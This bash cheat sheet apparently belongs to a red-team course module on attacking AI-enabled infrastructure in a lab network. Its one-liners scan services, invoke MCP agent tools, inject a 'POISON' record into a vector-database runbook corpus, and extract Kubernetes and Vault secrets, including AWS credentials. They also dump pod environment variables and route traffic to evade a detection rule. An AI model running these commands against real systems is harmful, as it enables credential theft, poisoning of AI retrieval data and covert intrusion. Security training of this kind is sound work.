#!/usr/bin/env bash
# Script: oneliners.sh
# Module: 10 — Threat Modeling for AI-Enabled Targets
# Purpose: Quick reference one-liners for AI system threat modeling

# ─── Network Recon ────────────────────────────────────────────────────────────
# Full scan (high noise)
nmap -sV -p- --open -T4 10.10.50.0/24

# Targeted AI service ports (lower noise)
nmap -sV -p 9000-9005,6333,5000,8200,16333 --open 10.10.50.0/24

# Quiet scan
nmap -sV -p- --open -T2 10.10.50.0/24

# TLS/mTLS check on agent ports
nmap --script ssl-cert -p 9000-9005 10.10.50.0/24

# ─── MCP Server ───────────────────────────────────────────────────────────────
# List all tools (find hidden tools not in OSINT)
curl -s http://10.10.50.15:9005/tools | jq '.tools[] | {name, description}'

# Invoke tool — non-destructive canary first
curl -s http://10.10.50.15:9005/invoke -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <TOKEN>" \
  -d '{"tool": "vault_rotate_secret", "params": {"secret_path": "secret/nexus/test_canary"}}'

# Invoke aws_cli_exec (LAST — starts 24hr reporting clock)
curl -s http://10.10.50.15:9005/invoke -X POST \
  -H "Authorization: Bearer <REMEDIATION_TOKEN>" \
  -d '{"tool": "aws_cli_exec", "params": {"command": "sts get-caller-identity", "region": "us-east-1"}}'

# ─── Qdrant ───────────────────────────────────────────────────────────────────
# List collections (auth check)
curl -s http://10.10.50.20:6333/collections | jq '.result.collections[].name'

# Scroll all points from a collection
curl -s http://10.10.50.20:6333/collections/detection_rules/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 100, "with_payload": true, "with_vector": false}' | jq '.'

# Filter by category
curl -s http://10.10.50.20:6333/collections/runbook_corpus/points/scroll \
  -X POST -H "Content-Type: application/json" \
  -d '{"limit": 50, "with_payload": true, "filter": {"must": [{"key": "category", "match": {"value": "runbook"}}]}}' | jq '.'

# Write to staging (RoE permits :16333)
curl -s http://10.10.50.20:16333/collections/runbook_corpus/points \
  -X PUT -H "Content-Type: application/json" \
  -d '{"points": [{"id": 9999, "vector": [0.1,0.2,0.3], "payload": {"content": "POISON", "category": "runbook"}}]}'

# ─── Kubernetes ───────────────────────────────────────────────────────────────
# List all secrets in namespace
kubectl --token=$K8S_TOKEN get secrets -n nexus-ai \
  -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}'

# Extract and decode agent token
kubectl --token=$K8S_TOKEN get secret nexus-remediation-agent-token -n nexus-ai \
  -o jsonpath='{.data.token}' | base64 -d

# Extract all key-value pairs from a secret
kubectl --token=$K8S_TOKEN get secret nexus-mcp-vault-approle -n nexus-ai \
  -o json | jq '.data | map_values(@base64d)'

# Check pod IPs (for routing through agent IP to evade qdrant-004)
kubectl --token=$K8S_TOKEN get pods -n nexus-ai -o wide

# Enumerate what the token can do
kubectl --token=$K8S_TOKEN auth can-i --list -n nexus-ai

# ─── JWT Analysis ─────────────────────────────────────────────────────────────
# Decode JWT header
echo "<TOKEN>" | cut -d'.' -f1 | base64 -d 2>/dev/null | jq '.'

# Decode JWT payload (agent name + scope claims)
echo "<TOKEN>" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '{agent, scope}'

# Python decode (handles padding correctly)
python3 -c "
import base64, json, sys
token = sys.argv[1]
for part in token.split('.')[:2]:
    padded = part + '=' * (4 - len(part) % 4)
    print(json.dumps(json.loads(base64.b64decode(padded)), indent=2))
" "<TOKEN>"

# ─── HashiCorp Vault ──────────────────────────────────────────────────────────
# Health check
curl -s http://10.10.50.22:8200/v1/sys/health | jq '{initialized, sealed, version}'

# AppRole login
curl -s http://10.10.50.22:8200/v1/auth/approle/login \
  -X POST -d '{"role_id": "<ID>", "secret_id": "<SECRET>"}' | jq '.auth.client_token'

# List secret paths
curl -s "http://10.10.50.22:8200/v1/secret/metadata/?list=true" \
  -H "X-Vault-Token: <TOKEN>" | jq '.data.keys'

# Read AWS credentials (Crown Jewel #1)
curl -s http://10.10.50.22:8200/v1/secret/data/nexus/aws \
  -H "X-Vault-Token: <TOKEN>" | jq '.data.data'

# ─── MLflow ───────────────────────────────────────────────────────────────────
# List registered models
curl -s http://10.10.50.21:5000/api/2.0/mlflow/registered-models/list | jq '.'

# Search model versions
curl -s "http://10.10.50.21:5000/api/2.0/mlflow/model-versions/search?filter=name%3D'nexus_triage'" | jq '.'

# ─── Credential Scanning ──────────────────────────────────────────────────────
# trufflehog against ECR/Docker image
trufflehog docker --image nexus-remediation-agent:latest

# trufflehog against a git repo
trufflehog git https://github.com/megacorpfs/nexus-mcp-tools

# Dump all pod env vars (secret hunting)
for pod in $(kubectl --token=$K8S_TOKEN get pods -n nexus-ai -o name); do
  echo "=== $pod ==="
  kubectl --token=$K8S_TOKEN exec -n nexus-ai $pod -- env 2>/dev/null
done
